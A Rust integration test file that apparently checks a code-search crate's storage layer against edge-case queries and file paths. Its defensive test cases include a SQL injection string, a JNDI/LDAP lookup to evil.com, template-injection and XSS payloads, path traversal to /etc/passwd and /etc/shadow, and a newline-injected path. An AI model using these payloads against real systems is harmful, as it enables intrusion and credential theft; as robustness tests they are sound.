use kt::config::Config;
use kt::storage::Storage;

async fn make_storage() -> Storage {
    let config = Config::from_env();
    let storage = Storage::new(&config).unwrap();
    storage.ensure_index().await.unwrap();
    storage
}

#[tokio::test]
async fn test_empty_query() {
    let storage = make_storage().await;
    let result = storage.hybrid_search(&vec![0.0f32; 384], "", None, 3).await;
    match result {
        Ok(results) => {
            assert!(results.len() <= 3, "empty query should respect top_k");
            eprintln!("PASS: empty query returned {} results", results.len());
        }
        Err(e) => panic!("FAIL: empty query crashed: {e}"),
    }
}

#[tokio::test]
async fn test_whitespace_only_query() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "   \t\n  ", None, 3)
        .await;
    match result {
        Ok(results) => eprintln!("PASS: whitespace query returned {} results", results.len()),
        Err(e) => panic!("FAIL: whitespace query crashed: {e}"),
    }
}

#[tokio::test]
async fn test_zero_top_k() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "function", None, 0)
        .await;
    match result {
        Ok(results) => {
            assert!(results.is_empty(), "top_k=0 should return empty results");
            eprintln!("PASS: top_k=0 returned empty");
        }
        Err(e) => panic!("FAIL: top_k=0 crashed: {e}"),
    }
}

#[tokio::test]
async fn test_huge_top_k() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "function", None, 10000)
        .await;
    match result {
        Ok(results) => eprintln!("PASS: huge top_k returned {} results", results.len()),
        Err(e) => panic!("FAIL: huge top_k crashed: {e}"),
    }
}

#[tokio::test]
async fn test_special_chars_in_query() {
    let storage = make_storage().await;
    let nasty_queries: Vec<&str> = vec![
        "'; DROP TABLE chunks; --",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<script>alert('xss')</script>",
        "fn foo() { let x = \"hello\"; }",
        "a\x00b\x01c",
        "query with \"quotes\" and 'apostrophes'",
        "back\\slash",
        "query:with:colons",
        "query(with)parens",
        "query{with}braces",
        "query|with|pipes",
        "query@with@ats",
        "query!with!bangs",
        "query-with-dashes",
        "query*with*wildcards",
        "query[with]brackets",
    ];
    for q in nasty_queries {
        let result = storage.hybrid_search(&vec![0.0f32; 384], q, None, 3).await;
        match result {
            Ok(results) => {
                let display = &q[..q.len().min(40)];
                eprintln!(
                    "PASS: special char query {:?} returned {} results",
                    display,
                    results.len()
                );
            }
            Err(e) => panic!(
                "FAIL: special char query {:?} crashed: {e}",
                &q[..q.len().min(40)]
            ),
        }
    }
}

#[tokio::test]
async fn test_read_nonexistent_file() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("nonexistent_file.rs").await;
    match result {
        Ok(results) => {
            assert!(results.is_empty(), "nonexistent file should return empty");
            eprintln!("PASS: nonexistent file returned empty");
        }
        Err(e) => panic!("FAIL: nonexistent file crashed: {e}"),
    }
}

#[tokio::test]
async fn test_read_path_traversal() {
    let storage = make_storage().await;
    let traversal_paths: Vec<&str> = vec![
        "../../../etc/passwd",
        "/etc/shadow",
        "src/../../../etc/hosts",
    ];
    for path in traversal_paths {
        let result = storage.read_file_chunks(path).await;
        match result {
            Ok(results) => {
                assert!(
                    results.is_empty(),
                    "path traversal {:?} should return empty",
                    path
                );
                eprintln!("PASS: path traversal {:?} returned empty (safe)", path);
            }
            Err(e) => panic!("FAIL: path traversal {:?} crashed: {e}", path),
        }
    }
}

#[tokio::test]
async fn test_read_wildcard_path() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("src/*.rs").await;
    match result {
        Ok(results) => {
            assert!(results.is_empty(), "wildcard should not match");
            eprintln!("PASS: wildcard path returned {} results", results.len());
        }
        Err(e) => panic!("FAIL: wildcard path crashed: {e}"),
    }
}

#[tokio::test]
async fn test_read_empty_path() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("").await;
    match result {
        Ok(results) => eprintln!("PASS: empty path returned {} results", results.len()),
        Err(e) => panic!("FAIL: empty path crashed: {e}"),
    }
}

#[tokio::test]
async fn test_language_filter() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "function", Some(&kt::Language::Rust), 3)
        .await;
    match result {
        Ok(results) => {
            for r in &results {
                assert_eq!(
                    r.language,
                    kt::Language::Rust,
                    "language filter should work"
                );
            }
            eprintln!(
                "PASS: language filter returned {} rust results",
                results.len()
            );
        }
        Err(e) => panic!("FAIL: language filter crashed: {e}"),
    }
}

#[tokio::test]
async fn test_long_query() {
    let storage = make_storage().await;
    let long_query = "x".repeat(100_000);
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], &long_query, None, 3)
        .await;
    match result {
        Ok(results) => eprintln!("PASS: 100k char query returned {} results", results.len()),
        Err(e) => panic!("FAIL: 100k char query crashed: {e}"),
    }
}

#[tokio::test]
async fn test_long_filepath() {
    let storage = make_storage().await;
    let long_path = "src/".to_string() + &"a".repeat(10_000) + ".rs";
    let result = storage.read_file_chunks(&long_path).await;
    match result {
        Ok(results) => eprintln!("PASS: 10k char filepath returned {} results", results.len()),
        Err(e) => panic!("FAIL: 10k char filepath crashed: {e}"),
    }
}

#[tokio::test]
async fn test_remove_nonexistent_file() {
    let storage = make_storage().await;
    let result = storage
        .remove_file_chunks("this_file_does_not_exist.rs")
        .await;
    match result {
        Ok(count) => {
            assert_eq!(count, 0, "removing nonexistent file should return 0");
            eprintln!("PASS: remove nonexistent file returned 0");
        }
        Err(e) => panic!("FAIL: remove nonexistent file crashed: {e}"),
    }
}

#[tokio::test]
async fn test_unicode_query() {
    let storage = make_storage().await;
    let unicode_queries: Vec<&str> = vec![
        "\u{95a2}\u{6570}",
        "\u{444}\u{443}\u{43d}\u{43a}\u{446}\u{438}\u{44f}",
        "\u{1f50d}search",
        "\u{4f60}\u{597d}",
    ];
    for q in unicode_queries {
        let result = storage.hybrid_search(&vec![0.0f32; 384], q, None, 3).await;
        match result {
            Ok(results) => eprintln!(
                "PASS: unicode query {:?} returned {} results",
                q,
                results.len()
            ),
            Err(e) => panic!("FAIL: unicode query {:?} crashed: {e}", q),
        }
    }
}

#[tokio::test]
async fn test_newlines_in_filepath() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("src/lib.rs\nmalicious").await;
    match result {
        Ok(results) => eprintln!(
            "PASS: newline in filepath returned {} results",
            results.len()
        ),
        Err(e) => panic!("FAIL: newline in filepath crashed: {e}"),
    }
}
